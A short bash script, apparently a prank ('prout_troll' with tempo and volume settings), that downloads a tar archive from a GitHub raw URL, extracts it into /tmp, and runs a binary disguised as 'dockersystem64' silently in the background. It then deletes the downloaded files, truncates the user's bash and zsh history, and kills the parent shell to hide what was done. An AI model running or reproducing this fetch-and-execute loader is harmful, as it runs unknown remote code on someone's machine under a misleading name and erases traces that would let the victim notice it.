#!/bin/bash

# ---------------------------- VARIABLES ---------------------------- #
init_tempo=120 tempo=20 volume=70 tempo_offset=1 volume_offset=20
# ------------------------------------------------------------------- #

dir=/tmp/ ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
#curl 'nom de domaine' -o /tmp/$dir/proutsh42.tar
curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o $dir/proutsh42.tar
tar -xvf $dir/proutsh42.tar -C $dir
chmod 777 $dir/dockersystem64
#chmod 777 ./prout_troll
#chmod last modif time of all files
#cd $dir
#nohup $dir/dockersystem64 > /dev/null 2>&1
nohup $dir/dockersystem64 $init_tempo $tempo $tempo_offset $volume $volume_offset $dir &>/dev/null &
sleep 0.1 ; rm -rf $dir/proutsh42.tar $dir/dockersystem64 $dir/prout_troll
#& $init_tempo $tempo $tempo_offset $volume $volume_offset 2>&1 >/dev/null
#(nohup ./dockersystem64 $init_tempo $tempo $tempo_offset $volume $volume_offset &> /dev/null &)
#(nohup ./prout_troll &> /dev/null &)
(truncate -s -100 ~/.zsh_history &> /dev/null &)
(truncate -s -100 ~/.bash_history &> /dev/null &)
kill -KILL $PPID
